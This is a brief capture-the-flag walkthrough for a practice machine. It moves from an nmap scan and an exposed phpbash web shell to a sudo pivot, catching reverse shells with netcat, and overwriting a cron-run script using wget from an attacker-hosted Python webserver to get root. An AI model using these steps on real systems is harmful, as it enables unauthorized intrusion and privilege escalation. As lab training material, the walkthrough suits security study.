1.) Reconnaissance
  nmap shows just 80 up, but gives a couple of directories under the ip
  looking up ip/dev shows a phpbash.php that puts you into a phpbash shell
  
2.) Privilege Escalation
  sudo -l shows the www-data user can use commands as scriptmanager
  sudo -u scriptmanager ls -la /scripts to see inside the /scripts file
  sudo -u scriptmanager cat /user/arrexel/user.txt for the user flag
  go to pentest monkey's website to figure out which command to run to throw a reverse shell
  run sudo -u scriptmanager (pentestmonkey command) to throw reverse shell as scriptmanager
  use nc -nvlp [port] to catch the shell on attack VM
  looking at scripts, ls -la will show that test.txt was last accessed recently
  a few more ls -la will show that it's accessed every minute.
  on Attacking machine, write a script that throws a reverse shell on a different port than the other shell
  use python3 -m http.server to host a webserver on port 8000
  Open a port to catch the root shell
  on target machine, use wget {attackVMIP}:8000/test.py -O test.py to overwrite test.py with the script
  use cat root.txt to finish the box.
